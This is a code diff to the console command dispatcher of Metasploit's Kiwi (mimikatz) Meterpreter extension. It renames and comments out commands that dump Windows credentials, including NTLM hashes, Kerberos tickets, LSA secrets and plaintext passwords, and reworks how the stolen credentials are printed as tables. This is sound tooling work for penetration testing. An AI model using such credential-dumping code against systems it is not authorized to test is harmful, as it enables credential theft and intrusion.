@@ -57,90 +57,36 @@ class Console::CommandDispatcher::Kiwi
   #
   def commands
     {
-      'kiwi_cmd'              => 'Execute an arbitary mimikatz command',
-      'creds_wdigest'         => 'Retrieve WDigest creds',
-      'creds_msv'             => 'Retrieve LM/NTLM creds (hashes)',
-      'creds_livessp'         => 'Retrieve LiveSSP creds',
-      'creds_ssp'             => 'Retrieve SSP creds',
-      'creds_tspkg'           => 'Retrieve TsPkg creds',
-      'creds_kerberos'        => 'Retrieve Kerberos creds',
-      'creds_all'             => 'Retrieve all credentials',
-      'golden_ticket_create'  => 'Create a golden kerberos ticket',
-      'kerberos_ticket_use'   => 'Use a kerberos ticket',
-      'kerberos_ticket_purge' => 'Purge any in-use kerberos tickets',
-      'kerberos_ticket_list'  => 'List all kerberos tickets',
-      'lsa_dump'              => 'Dump LSA secrets',
-      'wifi_list'             => 'List wifi profiles/creds'
+      'kiwi_cmd'              => 'Execute an arbitary mimikatz command (unparsed)',
+      'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
+      'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
+      #'creds_livessp'         => 'Retrieve LiveSSP creds',
+      #'creds_ssp'             => 'Retrieve SSP creds',
+      #'creds_tspkg'           => 'Retrieve TsPkg creds',
+      'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
+      'creds_all'             => 'Retrieve all credentials (parsed)',
+      #'golden_ticket_create'  => 'Create a golden kerberos ticket',
+      #'kerberos_ticket_use'   => 'Use a kerberos ticket',
+      #'kerberos_ticket_purge' => 'Purge any in-use kerberos tickets',
+      #'kerberos_ticket_list'  => 'List all kerberos tickets',
+      'lsa_dump_secrets'      => 'Dump LSA secrets (unparsed)',
+      #'wifi_list'             => 'List wifi profiles/creds',
     }
   end
 
   def cmd_kiwi_cmd(*args)
     output = client.kiwi.exec_cmd(args.join(' '))
-    # TODO: clean up!
     print_line(output)
   end
 
   #
   # Invoke the LSA secret dump on thet target.
   #
-  def cmd_lsa_dump(*args)
+  def cmd_lsa_dump_secrets(*args)
     check_privs
 
     print_status('Dumping LSA secrets')
-    lsa = client.kiwi.lsa_dump
-
-    # the format of this data doesn't really lend itself nicely to
-    # use within a table so instead we'll dump in a linear fashion
-
-    print_line("Policy Subsystem : #{lsa[:major]}.#{lsa[:minor]}") if lsa[:major]
-    print_line("Domain/Computer  : #{lsa[:compname]}") if lsa[:compname]
-    print_line("System Key       : #{to_hex(lsa[:syskey])}")
-    print_line("NT5 Key          : #{to_hex(lsa[:nt5key])}")
-    print_line
-    print_line("NT6 Key Count    : #{lsa[:nt6keys].length}")
-
-    if lsa[:nt6keys].length > 0
-      lsa[:nt6keys].to_enum.with_index(1) do |k, i|
-        print_line
-        index = i.to_s.rjust(2, ' ')
-        print_line("#{index}. ID           : #{Rex::Text::to_guid(k[:id])}")
-        print_line("#{index}. Value        : #{to_hex(k[:value])}")
-      end
-    end
-
-    print_line
-    print_line("Secret Count     : #{lsa[:secrets].length}")
-    if lsa[:secrets].length > 0
-      lsa[:secrets].to_enum.with_index(1) do |s, i|
-        print_line
-        index = i.to_s.rjust(2, ' ')
-        print_line("#{index}. Name         : #{s[:name]}")
-        print_line("#{index}. Service      : #{s[:service]}") if s[:service]
-        print_line("#{index}. NTLM         : #{to_hex(s[:ntlm])}") if s[:ntlm]
-        if s[:current] || s[:current_raw]
-          current = s[:current] || to_hex(s[:current_raw], ' ')
-          print_line("#{index}. Current      : #{current}")
-        end
-        if s[:old] || s[:old_raw]
-          old = s[:old] || to_hex(s[:old_raw], ' ')
-          print_line("#{index}. Old          : #{old}")
-        end
-      end
-    end
-
-    print_line
-    print_line("SAM Key Count    : #{lsa[:samkeys].length}")
-    if lsa[:samkeys].length > 0
-      lsa[:samkeys].to_enum.with_index(1) do |s, i|
-        print_line
-        index = i.to_s.rjust(2, ' ')
-        print_line("#{index}. RID          : #{s[:rid]}")
-        print_line("#{index}. User         : #{s[:user]}")
-        print_line("#{index}. LM Hash      : #{to_hex(s[:lm_hash])}")
-        print_line("#{index}. NTLM Hash    : #{to_hex(s[:ntlm_hash])}")
-      end
-    end
-
+    print_line(client.kiwi.lsa_dump_secrets)
     print_line
   end
 
@@ -387,7 +333,7 @@ class Console::CommandDispatcher::Kiwi
   # Dump all the possible credentials to screen.
   #
   def cmd_creds_all(*args)
-    method = Proc.new { client.kiwi.all_pass }
+    method = Proc.new { client.kiwi.creds_all }
     scrape_passwords('all', method, args)
   end
 
@@ -395,7 +341,7 @@ class Console::CommandDispatcher::Kiwi
   # Dump all wdigest credentials to screen.
   #
   def cmd_creds_wdigest(*args)
-    method = Proc.new { client.kiwi.wdigest }
+    method = Proc.new { client.kiwi.creds_wdigest }
     scrape_passwords('wdigest', method, args)
   end
 
@@ -403,39 +349,39 @@ class Console::CommandDispatcher::Kiwi
   # Dump all msv credentials to screen.
   #
   def cmd_creds_msv(*args)
-    method = Proc.new { client.kiwi.msv }
+    method = Proc.new { client.kiwi.creds_msv }
     scrape_passwords('msv', method, args)
   end
 
   #
   # Dump all LiveSSP credentials to screen.
   #
-  def cmd_creds_livessp(*args)
-    method = Proc.new { client.kiwi.livessp }
-    scrape_passwords('livessp', method, args)
-  end
+  #def cmd_creds_livessp(*args)
+  #  method = Proc.new { client.kiwi.livessp }
+  #  scrape_passwords('livessp', method, args)
+  #end
 
   #
   # Dump all SSP credentials to screen.
   #
-  def cmd_creds_ssp(*args)
-    method = Proc.new { client.kiwi.ssp }
-    scrape_passwords('ssp', method, args)
-  end
+  #def cmd_creds_ssp(*args)
+  #  method = Proc.new { client.kiwi.ssp }
+  #  scrape_passwords('ssp', method, args)
+  #end
 
   #
   # Dump all TSPKG credentials to screen.
   #
-  def cmd_creds_tspkg(*args)
-    method = Proc.new { client.kiwi.tspkg }
-    scrape_passwords('tspkg', method, args)
-  end
+  #def cmd_creds_tspkg(*args)
+  #  method = Proc.new { client.kiwi.tspkg }
+  #  scrape_passwords('tspkg', method, args)
+  #end
 
   #
   # Dump all Kerberos credentials to screen.
   #
   def cmd_creds_kerberos(*args)
-    method = Proc.new { client.kiwi.kerberos }
+    method = Proc.new { client.kiwi.creds_kerberos }
     scrape_passwords('kerberos', method, args)
   end
 
@@ -477,27 +423,26 @@ protected
     check_privs
     print_status("Retrieving #{provider} credentials")
     accounts = method.call
+    output = ""
 
-    table = Rex::Text::Table.new(
-      'Header'    => "#{provider} credentials",
-      'Indent'    => 0,
-      'SortIndex' => 0,
-      'Columns'   => [
-        'Domain', 'User', 'Password', 'LM Hash', 'NTLM Hash'
-      ]
-    )
+    accounts.keys.each do |k|
 
-    accounts.each do |acc|
-      table << [
-        acc[:domain] || '',
-        acc[:username] || '',
-        acc[:password] || '',
-        to_hex(acc[:lm]),
-        to_hex(acc[:ntlm])
-      ]
+      next if accounts[k].length == 0
+
+      table = Rex::Ui::Text::Table.new(
+        'Header'    => "#{k} credentials",
+        'Indent'    => 0,
+        'SortIndex' => 0,
+        'Columns'   => accounts[k][0].keys
+      )
+
+      accounts[k].each do |acct|
+        table << acct.values
+      end
+
+      output << table.to_s + "\n"
     end
 
-    output = table.to_s
     print_line(output)
 
     # determine if a target file path was passed in
